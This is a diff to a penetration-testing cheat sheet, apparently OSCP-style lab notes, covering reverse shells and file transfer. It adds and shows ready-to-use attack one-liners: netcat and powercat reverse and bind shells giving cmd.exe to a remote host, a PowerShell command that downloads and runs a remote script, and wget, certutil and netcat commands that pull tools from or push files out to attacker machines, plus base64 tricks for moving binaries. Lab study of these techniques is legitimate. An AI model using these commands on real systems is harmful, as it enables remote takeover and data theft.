@@ -1,4 +1,10 @@
 # Reverse shell
+## Listener 
+Before any reverse shell, you need to set up the listener, which will listen to a port and receive connections:
+```
+nc -nlvp <PORT>
+rlwrap nc -nlvp <PORT>
+```
 ## Netcat Traditional
 ```shell
 nc -e cmd.exe 10.0.0.1 4242
@@ -12,6 +18,18 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1'
 ```
 ```powershell
 powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
+```
+## Powercat
+```
+powercat -c 10.11.0.4 -p 443 -e cmd.exe
+```
+Or start bind shell listener
+```
+powercat -l -p 443 -e cmd.exe
+```
+And connect from kali:
+```
+nc 10.11.0.4 443
 ```
 ## Perl
 ```perl
@@ -257,6 +275,9 @@ C:\Windows\SysWOW64\fxstmp
 ## HTTP
 ### Wget
 #### Downloading files
+```
+wget -O "C:\home\student\pwc.ps1" http://192.168.119.244/tools/powercat.ps1
+```
 ### Curl
 #### Downloading files
 ### Cmd
@@ -269,6 +290,15 @@ Default powershell locations:
 ```
 C:\windows\syswow64\windowspowershell\v1.0\powershell
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell
+```
+#### Uploading files
+Encode and output to base64 text from our binary:
+```
+powershell -C "& {$outpath = (Join-Path (pwd) 'out_base64.txt'); $inpath = (Join-Path (pwd) 'file.exe'); [IO.File]::WriteAllText($outpath, ([convert]::ToBase64String(([IO.File]::ReadAllBytes($inpath)))))}"
+```
+Decode and create our binary file based on our base64 output from above:
+```
+powershell -C "& {$outpath = (Join-Path (pwd) 'file2.exe'); $inpath = (Join-Path (pwd) 'out_base64.txt'); [IO.File]::WriteAllBytes($outpath, ([convert]::FromBase64String(([IO.File]::ReadAllText($inpath)))))}"
 ```
 #### Downloading files
 
@@ -320,12 +350,31 @@ $class = $assem.GetType("ClassLibrary1.Class1")
 $method = $class.GetMethod("runner")
 $method.Invoke(0, $null)
 ```
+### Powercat
+#### Uploading files
+On Kali:
+```
+sudo nc -lnvp 443 > receiving_powercat.ps1
+```
+On Windows:
+```
+powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
+```
 ### CertReq
 #### Downloading files
 ```
 CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt
 ```
 ### CertUtil
+#### Uploading files
+Encode and output to base64 text from our binary:
+```
+certutil -encode data.txt tmp.b64 && findstr /v /c:- tmp.b64 > data.b64
+```
+Decode and create our binary file based on our base64 output from above:
+```
+certutil -decode data.b64 data.txt
+```
 #### Downloading files
 ```
 certutil.exe -urlcache -split -f http://10.0.0.1:4444/file.exe C:\Windows\Temp\file.exe
@@ -590,20 +639,20 @@ copy C:\Windows\Temp\file.exe \\10.0.0.1\kali\file.exe
 ### Downloading files
 On Kali run :
 ```
-nc -nvlp 4444 < /path/to/file.exe
+nc -nvlp <PORT> < /path/to/file.exe
 ```
 On Windosw run:
 ```
-nc.exe -nv 10.0.0.1 4444 > file.exe
+nc.exe -nv <IP> <PORT> > /path/to/file.exe
 ```
 ### Uploading files
 On Kali run:
 ```
-nc -nvlp 4444 > /path/to/file.exe
+nc -nvlp <PORT> > /path/to/file.exe
 ```
 On Windows run:
 ```
-nc.exe -nv 10.0.0.1 4444 < file.exe
+nc.exe -nv <IP> <PORT> < file.exe
 ```
 ## FTP
 ### Downloading files
